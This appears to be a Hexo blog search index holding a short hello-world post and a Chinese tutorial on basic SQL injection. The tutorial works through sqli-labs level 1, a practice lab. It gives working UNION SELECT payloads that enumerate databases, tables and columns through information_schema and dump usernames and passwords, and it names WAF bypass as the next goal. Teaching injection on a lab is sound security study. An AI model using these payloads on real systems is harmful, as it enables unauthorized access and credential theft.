<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SQL注入基础讲解(一)</title>
      <link href="/2024/10/21/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95(%E4%B8%80)/"/>
      <url>/2024/10/21/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="SQL注入——基本的注入方法-一"><a href="#SQL注入——基本的注入方法-一" class="headerlink" title="SQL注入——基本的注入方法(一)"></a>SQL注入——基本的注入方法(一)</h1><blockquote><p>最近几天学校刚好在学数据库，于是结合一下之前刷过的<strong>sql注入</strong>题做一个总结😎</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入?"></a>什么是SQL注入?</h3><p><strong>SQL注入</strong>（SQL Injection）是一种常见的Web安全漏洞,常常因为web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句</p><p><strong>即：注入产生的原因是后台服务器在接收相关参数时未做好过滤直接带入到数据库中查询，导致可以拼接执行构造的SQL语句</strong></p><p>我们以sqli-labs第一关为例</p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212015450.png"></p><p>用GET方法传入参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 //?表示查询参数</span><br></pre></td></tr></table></figure><p>说明我们查询成功了，结果如图所示</p><p>为了看清原理及其结果，我们打开源码查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>乍一看感觉好像没啥问题是嘛？</p><p>但是如果对于提交的参数<code>id</code>做出了刻意构造，构造出了恶意的参数，就会造成原有的sql语句发生变化，从而执行恶意代码，这就是sql注入的原理。</p><p>话不多说，让我们开始实践吧</p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212016597.png"></p><p>输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;</span><br></pre></td></tr></table></figure><p>发现会有一句报错</p><p><code>You have an error  in your SQL syntax; check the manual that corresponds to your MySQL  server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code></p><p>但是为什么这样会报错呢，我们可以把参数带入原来的sql语句中可以发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;1&#x27;&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>整个sql语句中多了一个单引号，因为多了一个单引号，新加的单引号会和前面的单引号成对(引号都是成对出现的),因此多出来的单引号就会报错</p><p>那么既然我们构造什么sql都会解析，能不能构造一些特别的语句呢?</p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212016071.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;%23</span><br></pre></td></tr></table></figure><p>为什么这时候程序却不报错了？</p><blockquote><p>注:这里的%23就是注释符# 因为url会通过url编码将<code>#</code>解析为%23</p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212017591.png"></p></blockquote><p>再带入sql语句看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;1&#x27;#&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>在这里注释符<code>#</code>发挥了他应有的作用，在注释符后面的代码全部都被注释掉了，因此无法发挥原有的作用</p><p>于是sql语句就变成了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;1&#x27;#;&quot;</span><br></pre></td></tr></table></figure><p>故成功的构造出了带有目的性的代码</p><h3 id="SQL注入的流程"><a href="#SQL注入的流程" class="headerlink" title="SQL注入的流程"></a>SQL注入的流程</h3><h4 id="一-判断是否存在sqI注入与sqI注入的类型"><a href="#一-判断是否存在sqI注入与sqI注入的类型" class="headerlink" title="一.判断是否存在sqI注入与sqI注入的类型"></a>一.判断是否存在sqI注入与sqI注入的类型</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先注入后,看是否有报错,是字符型还是数字型;然后再用order by爆字段(列)数,知道几个字段了,再输入相应字段的数,来看有几个显示位(回显)</span><br></pre></td></tr></table></figure><h4 id="二、判断sqI注入是字符型还是数字型"><a href="#二、判断sqI注入是字符型还是数字型" class="headerlink" title="二、判断sqI注入是字符型还是数字型"></a><strong>二、判断sqI注入是字符型还是数字型</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">比如说像id这个参数,我们输入id=1&#x27;报错了，说明是字符型注入,没有了话就是数字型注入</span><br></pre></td></tr></table></figure><h4 id="三、爆列数"><a href="#三、爆列数" class="headerlink" title="三、爆列数"></a><strong>三、爆列数</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">首先知道表格有几列:?id=1&#x27;order by 3 --+</span><br><span class="line">爆出显示位:?id=-1&#x27;union select 1,2,3--+</span><br><span class="line">获取当前数据名和版本号:?id=-1&#x27;union select 1,database(),version()--+ //爆库名、看显位</span><br><span class="line">因为只有三列，所以这里 select 1,2,3只能有三个数</span><br></pre></td></tr></table></figure><p><code>order by 4</code>到4时候会报错，说明只有三列</p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212017456.png"></p><h4 id="四、然后数据库名"><a href="#四、然后数据库名" class="headerlink" title="四、然后数据库名"></a><strong>四、然后数据库名</strong></h4><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212018797.png"></p><h4 id="五、爆表名"><a href="#五、爆表名" class="headerlink" title="五、爆表名"></a><strong>五、爆表名</strong></h4><p>爆表名了话我们就要知道一个东西,叫<code>information_schema</code></p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212018261.png"></p><p><code>information_schema</code> 在 MySQL 5.0 版本中引入，里面包括</p><table><thead><tr><th><strong>TABLES</strong></th><th>提供关于数据库中所有表的信息</th></tr></thead><tbody><tr><td><strong>COLUMNS</strong></td><td><strong>提供关于表的列信息</strong></td></tr><tr><td><strong>SCHEMATA</strong></td><td><strong>列出所有数据库（schema）的名称</strong></td></tr></tbody></table><p>等等</p><p>我们构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=&#x27;security&#x27;%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212019360.png"></p><p>爆出了表名了，假如敏感信息在<code>users</code>表下，我们要进入<code>users</code>表获取其字段名</p><h4 id="六、爆字段名"><a href="#六、爆字段名" class="headerlink" title="六、爆字段名"></a><strong>六、爆字段名</strong></h4><p>只需要修改一点地方</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,2,group_concat(column_name)from information_schema.columns where table_name=&#x27;users&#x27;%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212019842.png"></p><p><strong>通过上述操作可以得到两个敏感字段就是username和password,接下来我们就要得到该字段对应的内容。我自己加了一个id可以隔一下账户和密码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username ,id , password) from users%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212020794.png"></p><p>至此，一个简单的sql注入就完成了，但是实际中肯定没有这么简单，为了防范sql注入一些web应用会加上WAF(web application firewall)会对你传入的参数进行判断，是不是有害的，如果是则会拦截，因此学会绕过waf等才是我们的最终目的</p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的第一篇博客</title>
      <link href="/2024/10/08/hello-blog/"/>
      <url>/2024/10/08/hello-blog/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Hello-This-is-my-first-article🦄"><a href="#Hello-This-is-my-first-article🦄" class="headerlink" title="Hello! This is my first article🦄"></a>Hello! This is my first article🦄</h1><p>欢迎来到我的第一篇博客！这篇文章将记录我对日常生活、学习、编程以及网络安全的一些心得和思考。我希望通过写博客的方式，不仅能记录自己的成长历程，还能分享一些有价值的知识给大家。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> 教程 </tag>
            
            <tag> 博客搭建 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
